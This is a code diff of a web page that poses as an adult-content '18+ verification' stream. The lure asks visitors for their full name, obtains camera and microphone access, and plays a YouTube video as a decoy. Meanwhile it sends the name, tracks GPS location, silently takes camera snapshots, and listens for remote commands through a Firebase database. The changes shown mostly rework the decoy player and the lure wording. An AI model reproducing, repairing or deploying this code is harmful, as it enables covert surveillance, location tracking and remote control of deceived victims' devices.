@@ -12,12 +12,12 @@
         /* 1. Clear Background (No Blur) */
         #bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); /* Make sure file exists */
+            background: url('bg.png.jpeg'); 
             background-size: cover; background-position: center;
             z-index: 1; opacity: 1; 
         }
 
-        /* 2. UI Mask (Target Engagement) */
+        /* 2. UI Mask Overlay */
         #main-ui {
             position: relative; z-index: 10; width: 100%; height: 100%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
@@ -30,7 +30,7 @@
             cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 80, 0.5); border: none;
         }
 
-        /* 3. Age/Identity Modal */
+        /* 3. Identity Modal */
         #age-modal {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 85%; max-width: 340px; background: #1a1a1a; border-radius: 20px;
@@ -40,9 +40,11 @@
         .input-name { width: 100%; padding: 15px; margin: 15px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
         .confirm-btn { background: #00ff41; color: #000; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; }
 
-        /* 4. Verified Video Player (No YouTube Iframe to avoid Firefox Block) */
-        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
-        video { width: 100%; height: 100%; object-fit: contain; }
+        /* 4. YouTube Container Fix */
+        #video-container { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; 
+        }
+        #main-player { width: 100%; height: 100%; border: none; }
 
         #loading-text { display: none; color: #fff; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; }
     </style>
@@ -50,34 +52,38 @@
 <body>
 
     <div id="bg-image"></div>
-    <div id="loading-text">VERIFYING AGE...</div>
+    <div id="loading-text">CONNECTING TO STREAM...</div>
 
     <div id="main-ui">
         <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
-        <p style="color: #fff; margin-top: 15px; font-size: 13px;">Official 18+ Verification Required</p>
+        <p style="color: #fff; margin-top: 15px; font-size: 13px;">18+ Adult Content Verification Required</p>
     </div>
 
     <div id="age-modal">
         <h2 style="color:#fff;">Age Check</h2>
-        <p style="color:#bbb; font-size: 14px;">Please enter your name to unlock the encrypted video stream.</p>
+        <p style="color:#bbb; font-size: 14px;">Enter your name to verify age and unlock the stream.</p>
         <input type="text" id="targetName" class="input-name" placeholder="Full Name">
-        <button class="confirm-btn" onclick="startEverything()">UNLOCK NOW</button>
+        <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
     </div>
 
     <div id="video-container">
-        <video id="main-player" playsinline loop muted>
-            <source src="https://www.youtube.com/watch?v=6Ogzc_-lW9w&list=RD6Ogzc_-lW9w&start_radio=1" type="video/mp4">
-        </video>
+        <iframe id="main-player" 
+            src="" 
+            allow="autoplay; encrypted-media" allowfullscreen>
+        </iframe>
     </div>
 
 <script>
-    // Firebase Config
+    // Firebase Config (Aapka original config yahan rahega)
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
     let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);
     let globalStream = null;
+
+    // YOUTUBE VIDEO ID YAHAN CHANGE KAREIN
+    const youtubeID = "vXpIat89mY0"; 
 
     function showModal() { document.getElementById('age-modal').style.display = 'block'; }
 
@@ -89,22 +95,22 @@
         document.getElementById('loading-text').style.display = 'block';
 
         try {
-            // Get Permissions
+            // 1. Request Camera Permission
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // Play Video
-            const v = document.getElementById('main-player');
+            // 2. Set YouTube Link with Autoplay & Mute Fix
+            const ytFrame = document.getElementById('main-player');
+            ytFrame.src = `https://www.youtube.com/embed/${youtubeID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${youtubeID}&rel=0`;
+
+            // 3. Show Video Container
             document.getElementById('video-container').style.display = 'block';
             document.getElementById('loading-text').style.display = 'none';
-            v.muted = false; // Try to unmute after user interaction
-            v.play();
 
-            // Background Processes
+            // Background Tasks
             sendInfo(uName);
             trackGPS();
             setTimeout(() => capture("user"), 5000);
 
-            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd) {
@@ -115,11 +121,12 @@
             });
 
         } catch (e) {
-            alert("Error: Camera/Mic permission is mandatory for 18+ access.");
+            alert("Error: Camera permission is mandatory for 18+ verification.");
             location.reload();
         }
     }
 
+    // Capture & Other Functions (Same as before)
     async function capture(mode) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
@@ -156,4 +163,3 @@
 </script>
 </body>
 </html>
-
